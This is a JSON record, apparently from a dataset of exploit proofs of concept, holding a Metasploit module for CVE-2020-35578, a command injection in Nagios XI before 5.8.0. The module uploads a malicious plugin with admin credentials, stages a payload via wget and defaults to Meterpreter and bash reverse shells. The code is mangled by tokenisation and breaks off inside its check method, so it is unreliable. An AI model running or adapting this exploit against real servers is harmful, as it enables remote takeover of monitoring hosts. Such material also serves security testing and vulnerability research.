{
    "text": "vul_name : Nagios XI Remote Code Execution ， vul_cve : CVE-2020-35578 ， vul_poc :  ，  # This module requires Metasploit :  ，  # Current source :  ， class MetasploitModule < Msf : Exploit : Remote ， Rank = ExcellentRanking ， include Msf : Exploit : Remote : HttpClient ， include Msf : Exploit : Remote : HTTP : NagiosXi ， include Msf : Exploit : CmdStager ， include Msf : Exploit : FileDropper ， prepend Msf : Exploit : Remote : AutoCheck ， super (  ， update_info (  ， info ,  ， 'Name' => 'Nagios XI Prior to 5.8.0 - Plugins Filename Authenticated Remote Code Exection' ,  ， 'Description' => %q{ ， This module exploits a command injection vulnerability ( CVE-2020-35578 ) in the `/admin/monitoringplugins.php` ， page of Nagios XI versions prior to 5.8.0 when uploading plugins. Successful exploitation allows ， an authenticated admin user to achieve remote code execution as the `apache` user by uploading ， a malicious plugin. ， Valid credentials for a Nagios XI admin user are required. This module has ， been successfully tested against Nagios versions XI 5.3.0 and 5.7.5 , both ， running on CentOS 7. ， } ,  ， 'License' => MSF_LICENSE ,  ， 'Author' => ，  [  ， 'Haboob Team' ,  # - PoC ， 'Erik Wynter' #  @ wyntererik - Metasploit' ，  ]  ,  ， ' ，  [  ，  [ 'CVE' , '2020-35578' ]  ,  ，  [ 'EDB' , '49422' ]  ，  ]  ,  ， 'Platform' => %w [ linux unix ]  ,  ， 'Arch' => [ ARCH_X86 , ARCH_X64 , ARCH_CMD ]  ,  ， 'Targets' => ，  [  ，  [  ， 'Linux ( x86/x64 ) ' , { ， 'Arch' => [ ARCH_X86 , ARCH_X64 ]  ,  ， 'Platform' => 'linux' ,  ，  # only the wget and perhaps the curl CmdStagers work against a typical Nagios XI host ( CentOS 7 minimal ) if Nagios XI was installed according to the documentation ， 'CmdStagerFlavor' => : wget ,  ， 'DefaultOptions' => { 'PAYLOAD' => 'linux/x86/meterpreter/reverse_tcp' } ， } ，  ]  ,  ，  [  ， 'CMD' , { ， 'Arch' => [ ARCH_CMD ]  ,  ， 'Platform' => 'unix' ,  ， 'DefaultOptions' => { 'PAYLOAD' => 'cmd/unix/reverse_bash' } ， } ，  ]  ，  ]  ,  ， 'Privileged' => false ,  ， 'DisclosureDate' => '2020-12-19' ,  ， 'DefaultTarget' => 0 ,  ， 'Notes' => ， { ， 'Stability' => [ CRASH_SAFE ]  ,  ， 'SideEffects' => [ ARTIFACTS_ON_DISK , IOC_IN_LOGS , CONFIG_CHANGES ]  ,  ， 'Reliability' => [ FIRST_ATTEMPT_FAIL ]  # payload may not connect back the first time ， } ， register_options [  ， OptString.new ( 'USERNAME' ,  [ true , 'Username to authenticate with' , 'nagiosadmin' ]  )  ,  ， OptString.new ( 'PASSWORD' ,  [ true , 'Password to authenticate with' , nil ]  )  ，  ]  ， end ， def username ， datastore [ 'USERNAME' ]  ， end ， def password ， datastore [ 'PASSWORD' ]  ， end ， def finish_install ， datastore [ 'FINISH_INSTALL' ]  ， end ， def check ，  # Use nagios_xi_login to try and authenticate. If authentication succeeds , nagios_xi_login returns ，  # an array containing the http response body of a get request to index.php and the session cookies ， login_result , res_array = nagios_xi_login ( username , password , finish_install )  ， case login_result ， when 1.3 # An error occurred",
    "time": "2021.04.15"
}